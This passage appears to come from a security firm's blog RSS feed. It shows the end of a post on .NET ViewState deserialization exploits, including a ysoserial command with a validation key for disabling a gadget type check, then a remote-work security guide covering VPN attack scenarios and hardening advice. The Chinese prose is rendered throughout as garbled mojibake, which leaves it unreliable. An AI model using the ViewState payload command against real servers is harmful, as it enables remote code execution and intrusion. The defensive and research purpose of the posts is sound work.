&lt;p&gt;ä¸éæœ‰æ™‚ä¹Ÿæœƒå‡ºç¾é€™ç¨®æƒ…å¢ƒï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20200311/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸è«–æ€éº¼æ”¹ Payload å†é‡é€æ°¸é éƒ½æ˜¯å¾—åˆ° Server Errorï¼Œæ–¼æ˜¯å°±é–‹å§‹æ‡·ç–‘è‡ªå·±çš„äººç”Ÿ Q_Q&lt;/p&gt;

&lt;p&gt;ä½†ä¹Ÿåˆ¥æ€¥è‘—ç°å¿ƒï¼Œå¯èƒ½åªæ˜¯ä½ é‡ä¸Šçš„ç›®æ¨™æœ‰å¾ˆä¹–åœ°å®šæœŸæ›´æ–°äº†ä¼ºæœå™¨è€Œå·²ï¼Œå› ç‚ºå¾®è»Ÿæ›¾ç‚ºäº† ActivitySurrogateSelector é€™å€‹ gadget åŠ ä¸Šäº†ä¸€äº› patchï¼Œå°è‡´ç„¡æ³•ç›´æ¥åˆ©ç”¨ï¼Œå¥½åœ¨æœ‰å…¶ä»–ç ”ç©¶è€…é¦¬ä¸Šæä¾›äº†è§£æ±ºæ–¹æ³•ä½¿å¾—é€™å€‹ gadget èƒ½å†æ¬¡è¢«åˆ©ç”¨ï¼&lt;/p&gt;

&lt;p&gt;è©³ç´°ç´°ç¯€å¯ä»¥é–±è®€é€™ç¯‡æ–‡ç« ï¼š&lt;a href=&quot;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&quot;&gt;Re-Animating ActivitySurrogateSelector&lt;/a&gt; By &lt;a href=&quot;https://silentbreaksecurity.com/author/nick/&quot;&gt;Nick Landers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç¸½è€Œè¨€ä¹‹ï¼Œå¦‚æœé‡åˆ°ä¸Šè¿°æƒ…å½¢ï¼Œå¯ä»¥å…ˆå˜—è©¦ç”¨ä»¥ä¸‹æŒ‡ä»¤ç”¢ç”Ÿ VIEWSTATE ä¸¦ç™¼é€ä¸€æ¬¡çµ¦ä¼ºæœå™¨ï¼Œé †åˆ©çš„è©±å°±èƒ½ä½¿ç›®æ¨™ Runtime ç’°å¢ƒä¸‹çš„ DisableActivitySurrogateSelectorTypeCheck è®Šæ•¸å€¼è¢«è¨­ç‚º trueï¼Œéš¨å¾Œå†ç™¼é€çš„ ActivitySurrogateSelector gadget å°±ä¸æœƒå†å™´å‡º 500 Server Error äº†ã€‚&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
              -c &quot;ignore&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœä¸Šè¿°ä¸€åˆ‡éƒ½å¾ˆé †åˆ©ã€æˆåŠŸåŸ·è¡Œç³»çµ±æŒ‡ä»¤ä¸¦å›å‚³äº†çµæœï¼ŒåŸºæœ¬ä¸Šå°±è¶³å¤ åšå¤§éƒ¨åˆ†äº‹æƒ…ï¼Œè€Œå‰©ä¸‹çš„å°±æ˜¯ç¹¼çºŒç›¡æƒ…ç™¼æ®ä½ çš„æƒ³åƒåŠ›å§ï¼&lt;/p&gt;

&lt;p&gt;ä¸éæœ‰æ™‚å€™å³ä¾¿åˆ°äº†æ­¤ä¸€æ­¥é©Ÿé‚„æ˜¯æœƒæœ‰ä¸æ˜çš„éŒ¯èª¤ã€ä¸æ˜çš„åŸå› å°è‡´ MAC è¨ˆç®—å§‹çµ‚æ˜¯éŒ¯èª¤çš„ï¼Œå› ç‚º .NET å…§éƒ¨æ¼”ç®—æ³•ä»¥åŠéœ€è¦çš„ç’°å¢ƒåƒæ•¸çµ„åˆç¨å¾®è¤‡é›œï¼Œä½¿å¾—å·¥å…·æ²’è¾¦æ³•è¼•æ˜“æ¶µè“‹æ‰€æœ‰å¯èƒ½æƒ…æ³ï¼Œè€Œç•¶é‡åˆ°é€™ç¨®æƒ…å½¢æ™‚ï¼Œæˆ‘ç›®å‰é¸æ“‡çš„è§£æ±ºæ–¹æ³•éƒ½æ˜¯ç™¼æ®å·¥äººæ™ºæ…§ï¼Œå˜—è©¦åœ¨æœ¬æ©Ÿå»ºç«‹ç’°å¢ƒã€è¨­å®šç›¸åŒçš„ MachineKeyã€æ‰‹å·¥æ’°å¯« aspx æª”æ¡ˆï¼Œç”¢ç”ŸåŒ…å« gadget çš„ VIEWSTATE å†è½‰é€åˆ°ç›®æ¨™ä¸»æ©Ÿä¸Šã€‚å¦‚æœä½ æœ‰æ›´å¤šç™¼ç¾æˆ–ä¸ä¸€æ¨£çš„æƒ³æ³•é¡˜æ„åˆ†äº«çš„è©±ï¼Œä¹Ÿæ­¡è¿ä¾†å’Œæˆ‘äº¤æµèŠèŠå¤©ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</link>
                <guid>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell</guid>
                <pubDate>Wed, 11 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é è·å·¥ä½œçš„è³‡å®‰æ³¨æ„äº‹é …</title>
                <description>
&lt;p&gt;è¿‘æœŸå› æ–°å‹å† ç‹€ç—…æ¯’ï¼ˆCOVID-19, æ­¦æ¼¢è‚ºç‚ï¼‰å½±éŸ¿ï¼Œä¸å°‘ä¼æ¥­é–‹æ”¾åŒä»é è·å·¥ä½œ (Telework)ã€åœ¨å®¶ä¸Šç­ (Work from home, WFH)ã€‚åœ¨ç–«æƒ…åŠ é€Ÿæ™‚ï¼Œå¦‚æœæ²’æœ‰æº–å‚™å‘¨å…¨å°±è²¿ç„¶å…¨é¢é–‹æ”¾ï¼Œææ€•æœƒé­é‡å°šæœªè€ƒæ…®åˆ°çš„è³‡å®‰è­°é¡Œã€‚é€™ç¯‡æ–‡ç« æä¾›ä¸€å€‹ç°¡å–®çš„æŒ‡å¼•ï¼Œåˆ°åº•é ç«¯åœ¨å®¶ä¸Šç­æœ‰å“ªäº›æ³¨æ„äº‹é …ï¼Ÿæˆ‘å€‘æœƒå¾å…¬å¸ç®¡ç†ã€ä½¿ç”¨è€…å…©å€‹é¢å‘ä¾†è¨è«–ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœä½ åªæƒ³çœ‹é‡é»ï¼Œè«‹è·³åˆ°æœ€å¾Œä¸€æ®µ TL;DRã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ”»æ“Šæ‰‹æ®µ&quot;&gt;æ”»æ“Šæ‰‹æ®µ&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘å…ˆä¾†èŠèŠæ”»æ“Šçš„æ‰‹æ®µã€‚è©¦æƒ³ä»¥ä¸‹å¹¾å€‹æ”»æ“Šæƒ…å¢ƒï¼Œé€™äº›æƒ…å¢ƒéƒ½æ›¾è¢«æˆ‘å€‘åˆ©ç”¨åœ¨ç´…éšŠæ¼”ç·´çš„éç¨‹ä¸­ï¼ŒåŒæ¨£ä¹Ÿå¯èƒ½æ˜¯ä¼æ¥­çš„ç›²é»ã€‚&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æƒ…å¢ƒä¸€ã€&lt;strong&gt;VPN æ’åº«æ”»æ“Š&lt;/strong&gt;ï¼šåŒä» A ä½¿ç”¨ VPN é€£ç·šä¼æ¥­å…§éƒ¨ç¶²è·¯ï¼Œä½† VPN å¸³è™Ÿä½¿ç”¨çš„æ˜¯è‡ªå·±æ…£ç”¨çš„å¸³è™Ÿå¯†ç¢¼ï¼Œä¸¦ä¸”å°‡é€™çµ„å¸³è™Ÿå¯†ç¢¼é‡è¤‡ä½¿ç”¨åœ¨å¤–å…¶ä»–éå…¬å¸çš„æœå‹™ä¸Šï¼ˆå¦‚ Facebookã€Adobeï¼‰ï¼Œè€Œé€™çµ„å¯†ç¢¼åœ¨å¹¾æ¬¡å¤–æ´©äº‹ä»¶ä¸­æ—©å·²å¤–æ´©ã€‚æ”»æ“Šåœ˜éšŠé€éé–å®šåŒä» Aï¼Œä½¿ç”¨é€™çµ„å¯†ç¢¼ç™»å…¥ä¼æ¥­å…§éƒ¨ã€‚è€Œå¾ˆéºæ†¾çš„ VPN åœ¨ä¼æ¥­å…§éƒ¨ç¶²è·¯ä¸¦æ²’æœ‰åš´è¬¹çš„éš”é›¢ï¼Œå› æ­¤åœ¨å…§éƒ¨ç¶²è·¯çš„ç›´æ¥æ‰¾åˆ°å…§ç¶²å“¡å·¥ Portalï¼Œå–å¾—å„ç¨®æ©Ÿæ•è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;æƒ…å¢ƒäºŒã€&lt;strong&gt;VPN æ¼æ´&lt;/strong&gt;ï¼šVPN æ¼æ´å·²ç¶“æˆç‚ºæ”»æ“Šè€…çš„ä¸»è¦æ”»ç•¥ç›®æ¨™ï¼Œå…¬å¸ B ä½¿ç”¨çš„ VPN ä¼ºæœå™¨å«æœ‰æ¼æ´ï¼Œæ”»æ“Šåœ˜éšŠé€éæ¼æ´å–å¾— VPN ä¼ºæœå™¨çš„æ§åˆ¶æ¬Šå¾Œï¼Œå¾ç®¡ç†å¾Œå°é…ç½®å®¢æˆ¶ç«¯ logon scriptï¼Œåœ¨åŒä»ç™»å…¥æ™‚åŸ·è¡Œæƒ¡æ„ç¨‹å¼ï¼Œç²å¾—å…¶é›»è…¦æ§åˆ¶æ¬Šï¼Œä¸¦å–å¾—å…¬å¸æ©Ÿå¯†æ–‡ä»¶ã€‚å¯ä»¥åƒè€ƒä¹‹å‰ Orange &amp;amp; Meh çš„ç ”ç©¶ï¼š&lt;a href=&quot;https://www.youtube.com/watch?v=v7JUMb70ON4&quot;&gt; https://www.youtube.com/watch?v=v7JUMb70ON4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;æƒ…å¢ƒä¸‰ã€&lt;strong&gt;ä¸­é–“äººæ”»æ“Š&lt;/strong&gt;ï¼šåŒä» C åœ¨å®¶é€é PPTP VPN å·¥ä½œã€‚ä¸å¹¸çš„æ˜¯ C å°å­©çš„é›»è…¦ä¸­å®‰è£äº†å«æœ‰æƒ¡æ„ç¨‹å¼çš„ç›œç‰ˆè»Ÿé«”ã€‚æ”»æ“Šè€…é€è©²é›»è…¦è…¦é€²è¡Œå…§ç¶²ä¸­é–“äººæ”»æ“Š (MITM)ï¼ŒåŠ«æŒ C çš„æµé‡ä¸¦ç ´è§£å–å¾— VPN å¸³è™Ÿå¯†ç¢¼ï¼ŒæˆåŠŸé€²å…¥ä¼æ¥­å…§ç¶²ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä»¥ä¸Šåªæ˜¯å¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„æƒ…å¢ƒï¼Œæ”»æ“Šåœ˜éšŠçš„é¢å‘éå¸¸å»£ï¼Œè€Œä¼æ¥­çš„é˜²ç¦¦å»ä¸å®¹æ˜“åšåˆ°æ»´æ°´ä¸æ¼ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘è¦æ’°å¯«é€™ç¯‡æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¹«åŠ©ä¸€äº›ä¼æ¥­åœ¨é è·å·¥ä½œçš„æ™‚æœŸä¹Ÿèƒ½é”åˆ°åŸºæœ¬çš„å®‰å…¨ã€‚&lt;/p&gt;

&lt;h2 id=&quot;é¢¨éšªæœ‰ä»€éº¼&quot;&gt;é¢¨éšªæœ‰ä»€éº¼&lt;/h2&gt;

&lt;p&gt;é¢¨éšªæŒ‡çš„æ˜¯ç™¼ç”ŸæŸå€‹äº‹ä»¶å°æ–¼è©²ä¸»é«”å¯èƒ½é€ æˆçš„å±å®³ã€‚é€éå‰é¢ä»‹ç´¹çš„æ”»æ“Šæ‰‹æ®µè¦é”æˆå±å®³ï¼Œå°æ”»æ“Šè€…ä¾†èªªä¸¦ä¸å›°é›£ï¼Œæ¥è‘—æˆ‘å€‘ç›¤é»å‡ºä¸€äº›åœ¨ä¼æ¥­çš„è³‡å®‰è¦ç¯„ä¸‹ï¼Œå› æ‡‰é è·å·¥ä½œå¯èƒ½å¤§å¹…å¢åŠ æ”»æ“Šè€…é”æˆæ©Ÿç‡çš„å› å­ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç’°å¢ƒè¤‡é›œï¼šå…¬å¸ç„¡æ³•ç®¡æ§å®¶ä¸­ã€é è·çš„å·¥ä½œç’°å¢ƒï¼Œé€™äº›ç’°å¢ƒä¹Ÿæ¯”è¼ƒè¤‡é›œå±éšªã€‚ä¸€äº›å…¬å¸å…§éƒ¨çš„ç®¡ç†ç›£æ§æ©Ÿåˆ¶éƒ½é›£ä»¥æ–½å±•ï¼Œä¹Ÿè¼ƒé›£è¦æ±‚åŒä»åœ¨å®¶ä¸­ç§äººè¨­å‚™å®‰è£ç›£æ§æ©Ÿåˆ¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…¬å¸è³‡æ–™å¤–æ´©æˆ–ä¸ç•¶ä½¿ç”¨ï¼šè‹¥å…¬å¸çš„è³‡æ–™é­åˆ°å¤–æ´©æˆ–ä¸ç•¶ä½¿ç”¨ï¼Œå°‡æœƒæœ‰åš´é‡çš„æå¤±ã€‚&lt;/li&gt;
  &lt;li&gt;è¨­å‚™éºå¤±ã€é­ç«Šï¼šä¸ç®¡æ˜¯ç­†é›»æˆ–è€…æ˜¯æ‰‹æ©Ÿç­‰è£ç½®ï¼Œéºå¤±æˆ–è€…é­ç«Šæ™‚ï¼Œéƒ½æœƒæœ‰è³‡æ–™å¤–æ´©çš„é¢¨éšªã€‚&lt;/li&gt;
  &lt;li&gt;æˆæ¬Šæˆ–å­˜å–æ§åˆ¶ä¸æ˜“å¯¦ä½œï¼šåœ¨çŸ­æ™‚é–“å…§æä¾›å¤§é‡å“¡å·¥çš„å¤–éƒ¨å­˜å–ï¼Œå‹¢å¿…æœƒåœ¨ã€Œå¯ç”¨æ€§ã€å’Œã€Œå®‰å…¨æ€§ã€é–“åšå‡ºå–æ¨ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥å…¬å¸å…è¨±åŒä»ä½¿ç”¨ç§äººçš„è¨­å‚™é€£ä¸Šå…¬å¸å…§éƒ¨ VPNï¼Œé€™æ¨£çš„è­°é¡Œå°±ç­‰åŒ BYOD (Bring Your Own Device)ï¼Œé€™äº›å®‰å…¨æ€§çš„é¡§æ…®æœ‰ä¸å°‘æ–‡ç« å¯ä»¥åƒè€ƒã€‚ä¾‹å¦‚ NIST SP800-46 Guide to Enterprise Telework, Remote Access, and Bring Your Own Device (BYOD) Security&lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&quot;&gt; https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;å…¬å¸é¢å‘&quot;&gt;å…¬å¸é¢å‘&lt;/h2&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æˆ‘å€‘ä¾†çœ‹çœ‹å…¬å¸æ–¹é¢åœ¨é è·å·¥ä½œä¸Šé¢æœ‰å“ªäº›è³‡å®‰ä¸Šé¢çš„ä½œç‚ºã€‚&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œæµç¨‹åŠåŸå‰‡è¦åŠƒ&quot;&gt;å·¥ä½œæµç¨‹åŠåŸå‰‡è¦åŠƒ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;å·¥ä½œæµç¨‹èª¿æ•´&lt;/strong&gt;ï¼šé è·å·¥ä½œæ™‚ï¼Œæ¯å€‹æµç¨‹è©²å¦‚ä½•ä½œå°æ‡‰çš„èª¿æ•´ï¼Œä¾‹å¦‚å¦‚ä½•åœ¨ä¸åŒåœ°é»å”åŒä½œæ¥­ã€å½™æ•´å·¥ä½œè³‡æ–™ã€ç¢ºèªå·¥ä½œæˆæœåŠå“è³ªç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è³‡æ–™ç›¤é»&lt;/strong&gt;ï¼šå“ªäº›è³‡æ–™æ”¾åœ¨é›²ç«¯ã€ä¼ºæœå™¨ã€å€‹äººé›»è…¦ï¼Œç•¶é è·å·¥ä½œæ™‚å“ªäº›è³‡æ–™å°‡ç„¡æ³•è¢«å–ç”¨ï¼Œæˆ–è©²å°‡è³‡æ–™è½‰ç§»åˆ°å“ªé‚Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æœƒè­°æµç¨‹&lt;/strong&gt;ï¼šæœƒè­°æ™‚è¦–è¨Šè¨­å‚™ã€è»Ÿé«”é¸æ“‡åŠæ¸¬è©¦ï¼Œä¸¦æ³¨æ„æœƒè­°è»Ÿé«”é€šè¨Šæ˜¯å¦æœ‰åŠ å¯†ã€‚ç‹€æ³å¦‚æœƒè­°æ™‚é–“å»¶é•·ã€åŒæ™‚ç™¼è¨€ã€é è·å“è³ªå½±éŸ¿ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;äº‹ä»¶è™•ç†åœ˜éšŠåŠæµç¨‹&lt;/strong&gt;ï¼šå› é è·å·¥ä½œæ™‚ç™¼ç”Ÿçš„è³‡å®‰äº‹ä»¶ï¼Œè©²ç”±èª°è² è²¬è™•ç†ã€å¦‚ä½•è™•ç†ã€ç›¤é»æå¤±ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åƒ…çŸ¥ã€æœ€å°æ¬Šé™åŸå‰‡&lt;/strong&gt;ï¼šåƒ…çŸ¥åŸå‰‡ (Need-to-know Basis) ä»¥åŠæœ€å°æ¬Šé™åŸå‰‡ (Principle of Least Privilege, PoLP)ï¼Œåƒ…çµ¦äºˆæ¯å€‹åŒä»æœ€å°é™åº¦éœ€è¦çš„è³‡æ–™ä»¥åŠæ¬Šé™ï¼Œé¿å…é¡å¤–çš„å®‰å…¨å•é¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç¶²è·¯ç®¡ç†&quot;&gt;ç¶²è·¯ç®¡ç†&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;VPN å¸³è™Ÿç”³è«‹åŠç›¤é»&lt;/strong&gt;ï¼šå“ªäº›åŒä»éœ€è¦ä½¿ç”¨ VPNï¼Œå±¬æ–¼å“ªäº›ç¾¤çµ„ï¼Œæ¯å€‹ç¾¤çµ„çš„æ¬Šé™åŠé€£ç·šç¯„åœçš†ä¸åŒã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VPN å¸³è™Ÿæ¬Šé™ç¯„åœåŠå…§ç¶²åˆ†å€&lt;/strong&gt;ï¼šVPN é€£ç·šé€²ä¾†å¾Œï¼Œä¸æ‡‰å­˜å–æ•´å€‹å…¬å¸å…§ç¶²æ‰€æœ‰ä¸»æ©Ÿï¼Œå› ç‚º VPN è¦–åŒå¤–éƒ¨é€£ç·šï¼Œé¢¨éšªç­‰ç´šæ‡‰è©²æ›´é«˜ï¼Œæ›´æ‡‰è©²åšé€£ç·šçš„åˆ†å€ç®¡æ§ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç›£æ§ç¢ºèª VPN æµé‡åŠè¡Œç‚º&lt;/strong&gt;ï¼šé€éå…§éƒ¨ç¶²è·¯çš„ç¶²è·¯æµé‡ç›£æ§æ©Ÿåˆ¶ï¼Œç¢ºèª VPN ä½¿ç”¨æœ‰ç„¡ç•°å¸¸è¡Œç‚ºã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åªå…è¨±ç™½åå–®è¨­å‚™å–å¾— IP ä½å€&lt;/strong&gt;ï¼šå·²ç”³è«‹çš„è¨­å‚™æ‰èƒ½å–å¾—å…§ç¶² IP ä½å€ï¼Œé¿å…å¯ç–‘è¨­å‚™å‡ºç¾åœ¨å…§éƒ¨ç¶²è·¯ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;é–‹å•Ÿå¸³è™Ÿå¤šå› å­èªè­‰&lt;/strong&gt;ï¼šå°‡é›²ç«¯æœå‹™ã€VPNã€å…§éƒ¨ç¶²è·¯æœå‹™é–‹å•Ÿå¤šå› å­èªè­‰ã€‚&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;ç¢ºèª VPN ä¼ºæœå™¨æ˜¯å¦ç‚ºæ–°ç‰ˆ&lt;/strong&gt;ï¼šåœ¨æˆ‘å€‘éå»çš„ç ”ç©¶ç™¼ç¾ VPN ä¼ºæœå™¨ä¹Ÿæœƒæ˜¯æ”»æ“Šçš„å°è±¡ï¼Œå› æ­¤å¯†åˆ‡æ³¨æ„æ˜¯å¦æœ‰æ›´æ–°æˆ–è€…ä¿®è£œç¨‹å¼ã€‚&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Palo Alto GlobalProtect è³‡å®‰é€šå ± &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;FortiGate SSL VPN è³‡å®‰é€šå ± &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Pulse Secure SSL VPN è³‡å®‰é€šå ± &lt;a href=&quot;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä¸­å€¼å¾—ç‰¹åˆ¥é»å‡ºçš„æ˜¯ VPN çš„è¨­å®šèˆ‡é–‹æ”¾ã€‚è¿‘æœŸè½èåˆ°ä¸å°‘å…¬å¸çš„ç®¡ç†éšå±¤è«‡è«–åˆ°ï¼Œå› æ‡‰ç–«æƒ…åŸæœ¬ä¸é–‹æ”¾ VPN æ¬Šé™çš„åŒä»ç¾åœ¨å…¨é–‹æ”¾äº†ã€‚è€Œå•åˆ° VPN é€£ç·šé€²å…¬å¸å…§éƒ¨ç¶²è·¯ä¹‹å¾Œçš„ç›£æ§è·Ÿé˜»éš”ç‚ºä½•ï¼Œå»è¼ƒå°‘æœ‰ä¼æ¥­å…·å‚™é€™æ¨£çš„è¦åŠƒã€‚å…§éƒ¨ç¶²è·¯æ˜¯ä¼æ¥­çš„ä¸€å¤§è³‡å®‰æˆ°å ´ï¼Œé–‹æ”¾ VPN çš„åŒæ™‚ï¼Œå¿…å®šè¦æ€è€ƒè³‡å®‰å°æ‡‰çš„æªæ–½ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä½¿ç”¨è€…é¢å‘&quot;&gt;ä½¿ç”¨è€…é¢å‘&lt;/h2&gt;

&lt;p&gt;å…¬å¸æº–å‚™å¥½äº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯ä½¿ç”¨è€…çš„å®‰å…¨æ€§äº†ã€‚é™¤äº†å…¬å¸æä¾›çš„ VPN ç·šè·¯ã€æ¶æ§‹ã€æ©Ÿåˆ¶ä¹‹å¤–ï¼Œä½¿ç”¨è€…æœ¬èº«çš„è³‡å®‰æ„è­˜ã€è¦ç¯„ã€å®‰å…¨æ€§è¨­å®šä¹Ÿä¸€æ¨£é‡è¦ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¿å¯†&quot;&gt;ä¿å¯†&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;å°ˆæ©Ÿå°ˆç”¨&lt;/strong&gt;ï¼šç”¨ä¾†å­˜å–å…¬å¸ç¶²è·¯æˆ–è³‡æ–™çš„é›»è…¦ï¼Œæ‡‰åš´æ ¼éµå®ˆæ­¤åŸå‰‡ï¼Œç¦æ­¢å°‡è©²è¨­å‚™ä½œç‚ºéå…¬å‹™ç”¨é€”ã€‚ä¹Ÿæ‡‰é¿å…éå…¬å¸äººå£«ä½¿ç”¨æˆ–æ“ä½œè©²è£ç½®ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è¨­å‚™ç›¸é—œ&quot;&gt;è¨­å‚™ç›¸é—œ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;é–‹å•Ÿè£ç½®å”å°‹ã€é–å®šã€æ¸…é™¤åŠŸèƒ½&lt;/strong&gt;ï¼šè¨­å‚™è‹¥å¯æ”œå¸¶ç§»å‹•ï¼Œè¨­å‚™çš„éºå¤±å°æ‡‰æ–¹æ¡ˆå°±å¿…é ˆè¦è€ƒæ…®å®Œæ•´ã€‚ä¾‹å¦‚å¦‚ä½•å°‹æ‰¾è£ç½®ã€å¦‚ä½•é–å®šè£ç½®ã€å¦‚ä½•é ç«¯æ¸…é™¤å·²éºå¤±çš„è£ç½®é¿å…è³‡æ–™å¤–æ´©ã€‚ç¾åœ¨ä¸»æµä½œæ¥­ç³»çµ±å¤šåŠéƒ½æœƒæä¾›é€™äº›æ©Ÿåˆ¶ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è¨­å‚™ç™»å…¥å¯†ç¢¼&lt;/strong&gt;ï¼šè£ç½®ç™»å…¥æ™‚å¿…é ˆè¨­å®šå¯†ç¢¼ï¼Œé¿å…å¤–äººç›´æ¥æ“ä½œã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è¨­å‚™å…¨æ©ŸåŠ å¯†&lt;/strong&gt;ï¼šè¨­å‚™è‹¥éºå¤±é­åˆ°åˆ†æï¼Œå…¨æ©ŸåŠ å¯†å¯ä»¥é™ä½è³‡æ–™è¢«ç ´è§£éºå¤±çš„é¢¨éšªã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;MDM (Mobile Device Management)&lt;/strong&gt;ï¼šè‹¥å…¬å¸æœ‰å°å…¥ MDMï¼Œå¯ä»¥å”åŠ©ä»¥ä¸Šçš„ç®¡ç†ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¸³è™Ÿå¯†ç¢¼å®‰å…¨&quot;&gt;å¸³è™Ÿå¯†ç¢¼å®‰å…¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ä½¿ç”¨å¯†ç¢¼ç®¡ç†å·¥å…·ä¸¦è¨­å®šã€Œå¼·å¯†ç¢¼ã€&lt;/strong&gt;ï¼šå¯ä»¥è€ƒæ…®ä½¿ç”¨å¯†ç¢¼ç®¡ç†å·¥å…·ä¸¦å°‡å¯†ç¢¼è¨­ç‚ºå…¨éš¨æ©Ÿç”¢ç”ŸåŒ…å«è‹±æ–‡ã€æ•¸å­—ã€ç¬¦è™Ÿçš„å¯†ç¢¼ä¸²ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ä¸åŒç³»çµ±å¸³è™Ÿä½¿ç”¨ä¸åŒå¯†ç¢¼&lt;/strong&gt;ï¼šé€™å€‹åœ¨å¾ˆå¤šæ¬¡æ¼”è¬›ä¸­éƒ½æœ‰æåˆ°ï¼Œå»ºè­°æ¯å€‹ç³»çµ±çš†ä½¿ç”¨ä¸åŒå¯†ç¢¼ï¼Œé˜²æ­¢æ’åº«æ”»æ“Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å¸³è™Ÿé–‹å•Ÿ 2FA / MFA&lt;/strong&gt;ï¼šè‹¥ç³»çµ±å…·å‚™ 2FA / MFA æ©Ÿåˆ¶ï¼Œå‹™å¿…é–‹å•Ÿï¼Œç‚ºå¸³è™Ÿå¤šä¸€å±¤ä¿è­·ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç¶²è·¯ä½¿ç”¨&quot;&gt;ç¶²è·¯ä½¿ç”¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;é¿å…ä½¿ç”¨å…¬ç”¨ Wi-Fi é€£æ¥å…¬å¸ç¶²è·¯&lt;/strong&gt;ï¼šå…¬çœ¾å…¬ç”¨ç¶²è·¯æ˜¯ç›¸ç•¶å±éšªçš„ï¼Œæè¢«å´éŒ„æˆ–ç«„æ”¹ã€‚è‹¥å¿…è¦æ™‚å¯ä½¿ç”¨æ‰‹æ©Ÿç†±é»æˆ–é€é VPN é€£æ¥ç¶²éš›ç¶²è·¯ã€‚&lt;/li&gt;
